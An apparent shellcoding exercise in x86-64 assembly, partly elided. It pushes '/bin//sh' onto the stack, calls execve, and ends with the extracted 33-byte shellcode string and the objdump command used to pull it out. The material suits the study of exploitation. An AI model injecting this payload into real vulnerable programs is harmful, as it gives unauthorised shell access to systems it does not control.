...
_start:
        ...
        ;                                                                                                                                                                                            ; man execve provides, in part:                                                                                                                                                              ; On Linux, argv and envp can be specified as NULL.
        ; In both cases, this has the same effect as specifying the argument as a pointer to a list containing a single null pointer.                                                                ; Do not take advantage of this nonstandard and nonportable misfeature!                                                                                                                      ;                                                                                                                                                                                                                                                                                                                                                                                         xor rax, rax                            ; nulls
        ...
        push rbx                        ; push 8 bytes of hs//nib/ onto stack                                                                                                                                                                                                                                                                                                                     mov rdi, rsp                    ; _filename = 47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  47 '/'  115 's' 104 'h'
...
; shellcode extracted from objdump
; for i in `objdump -d 029_execve_shellcode_stack | grep "^ "| cut -f2`; do echo -n '\x'$i; done; echo
;
; \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x50\x48\x89\xe2\x48\x83\xc0\x3b\x0f\x05
